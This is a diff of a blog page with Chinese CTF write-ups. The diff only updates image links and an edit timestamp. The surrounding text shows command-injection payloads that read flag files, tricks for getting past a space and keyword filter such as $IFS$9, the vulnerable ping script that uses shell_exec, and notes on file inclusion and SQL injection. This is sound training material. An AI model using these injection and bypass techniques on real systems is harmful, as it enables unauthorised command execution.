@@ -874,7 +874,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-08-04 01:26:02" itemprop="dateModified" datetime="2023-08-04T01:26:02+08:00">2023-08-04</time>
+                <time title="Modified: 2023-08-04 21:32:19" itemprop="dateModified" datetime="2023-08-04T21:32:19+08:00">2023-08-04</time>
               </span>
 
           
@@ -902,7 +902,7 @@
 
 
 
-<h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p><img src="F:\blog\public\images\image-20230804003415866.png" alt="image-20230804003415866"></p>
+<h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p><img src="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230804003415866.png?raw=true" alt="image-20230804003415866"></p>
 <p>可以看出其中包含<code>flag.php</code>文件，文件包含</p>
 <p>考点php伪协议</p>
 <blockquote>
@@ -913,12 +913,12 @@
 
 <p>得到base64编码后的内容，解码后得到flag</p>
 <h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>&#96;127.0.0.1|ls</p>
-<p><img src="F:\blog\public\images\image-20230804005242003.png" alt="image-20230804005242003"></p>
+<p><img src="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230804005242003.png?raw=true" alt="image-20230804005242003"></p>
 <p>查看当前目录，只有一个i<code>ndex.php</code></p>
 <p>查看上级目录<code>127.0.0.1|ls /</code></p>
-<p><img src="F:\blog\public\images\image-20230804005433299.png" alt="image-20230804005433299"></p>
+<p><img src="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230804005433299.png?raw=true" alt="image-20230804005433299"></p>
 <p>查看flag<code>127.0.0.1|cat /flag</code></p>
-<p><img src="F:\blog\public\images\image-20230804005555240.png" alt="image-20230804005555240"></p>
+<p><img src="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230804005555240.png?raw=true" alt="image-20230804005555240"></p>
 <h3 id="常见管道符"><a href="#常见管道符" class="headerlink" title="常见管道符"></a>常见管道符</h3><ol>
 <li><code>|</code>（就是按位或），直接执行<code>|</code>后面的语句</li>
 <li><code>||</code>（就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</li>
@@ -929,18 +929,18 @@
 <p>另一种pyload<code>1 ||cat /flag</code></p>
 <h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>和上一题有点类似</p>
 <p>先get穿个<code>127.0.0.1|ls</code></p>
-<p><img src="F:\blog\public\images\image-20230804010050355.png" alt="image-20230804010050355"></p>
+<p><img src="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230804010050355.png?raw=true" alt="image-20230804010050355"></p>
 <p>然后<code>127.0.0.1|cat flag.php</code></p>
-<p><img src="F:\blog\public\images\image-20230804010155742.png" alt="image-20230804010155742"></p>
+<p><img src="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230804010155742.png?raw=true" alt="image-20230804010155742"></p>
 <p>空格被过滤</p>
 <blockquote>
 <p>命令中空格被过滤的解决方法：<br>{cat,flag.txt}<br>cat${IFS}flag.txt<br>cat$IFS$9flag.txt: $IFS$9 $9指传过来的第9个参数<br>cat&lt;flag.txt<br>cat&lt;&gt;flag.txt<br>kg&#x3D;$’\x20flag.txt’&amp;&amp;cat$kg<br>(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</p>
 </blockquote>
 <p>试试第一个方法：<code>/?ip=127.0.0.1|&#123;cat,flag.php&#125;</code></p>
-<p><img src="F:\blog\public\images\image-20230804010408972.png" alt="image-20230804010408972"></p>
+<p><img src="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230804010408972.png?raw=true" alt="image-20230804010408972"></p>
 <p>符号被过滤</p>
 <p>试试<code>?ip=127.0.0.1|cat$IFS$9flag.php</code></p>
-<p><img src="F:\blog\public\images\image-20230804010625277.png" alt="image-20230804010625277"></p>
+<p><img src="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230804010625277.png?raw=true" alt="image-20230804010625277"></p>
 <p>flag也被过滤</p>
 <p>查看一下index.php文件<code>?ip=127.0.0.1|cat$IFS$9index.php</code></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">|\<span class="string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span></span><br><span class="line"><span class="string">    die(&quot;fxck your symbol!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your space!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your bash!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your flag!&quot;);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span></span><br><span class="line"><span class="string">  echo &quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;;</span></span><br><span class="line"><span class="string">  print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -957,8 +957,8 @@
 
 
 <h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/103239145">https://blog.csdn.net/qq_44657899/article/details/103239145</a></p>
-<p><img src="F:\blog\public\images\image-20230804012036437.png" alt="image-20230804012036437"></p>
-<p><img src="F:\blog\public\images\image-20230804012047000.png" alt="image-20230804012047000"></p>
+<p><img src="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230804012036437.png?raw=true" alt="image-20230804012036437"></p>
+<p><img src="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230804012047000.png?raw=true" alt="image-20230804012047000"></p>
 <p>查询3时无结果，说明有两个字段</p>
 <p>尝试联合查询，报错<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p>
 <p>过滤了<code>select|update|delete|drop|insert|where|\./i</code></p>
